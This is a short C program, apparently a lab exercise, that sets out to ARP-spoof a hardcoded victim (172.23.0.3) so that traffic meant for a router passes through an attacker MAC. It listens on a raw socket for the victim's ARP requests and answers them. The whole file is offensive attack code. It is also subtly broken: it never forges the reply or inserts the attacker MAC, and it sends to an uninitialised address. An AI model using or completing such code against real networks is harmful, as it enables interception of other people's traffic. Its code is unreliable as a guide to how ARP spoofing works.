#include <netinet/if_ether.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <linux/if_packet.h>
#include <netinet/in.h>

#define BUFFER_SIZE 42  // Размер ARP пакета
#define VICTIM_IP "172.23.0.3"
#define ROUTER_IP "172.23.0.2"
#define MALCOLM_MAC "\x02\x42\xac\x17\x00\x04"

// Функция для получения сокета
int create_raw_socket() {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("Socket creation failed");
        exit(1);
    }
    return sock;
}

// Основная функция
int main() {
    int sock = create_raw_socket();  // Создаем raw-сокет
    char buffer[BUFFER_SIZE];  // Буфер для пакета
    struct sockaddr_ll sa;  // Структура для отправки пакета

    while (1) {
        // Принимаем ARP запрос
        ssize_t len = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
        if (len < 0) {
            perror("Recvfrom failed");
            close(sock);
            exit(1);
        }

        struct ethhdr *eth_header = (struct ethhdr *)buffer;
        struct ether_arp *arp_header = (struct ether_arp *)(buffer + sizeof(struct ethhdr));

        // Проверяем, что это ARP запрос (opcode 1)
        if (ntohs(arp_header->arp_op) == 1) {
            char sender_ip[INET_ADDRSTRLEN];
            char target_ip[INET_ADDRSTRLEN];

            inet_ntop(AF_INET, arp_header->arp_spa, sender_ip, INET_ADDRSTRLEN);
            inet_ntop(AF_INET, arp_header->arp_tpa, target_ip, INET_ADDRSTRLEN);

            // Проверка на нужные IP
            if (strcmp(sender_ip, VICTIM_IP) == 0 && strcmp(target_ip, ROUTER_IP) == 0) {
                printf("Victim is: %s \nRouter is: %s \n", sender_ip, target_ip);


                if (sendto(sock, buffer, len, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
                    perror("Failed to send ARP response");
                } else {
                    printf("Sent ARP Response\n");
                }
            }
        }
    }

    close(sock);
    return 0;
}
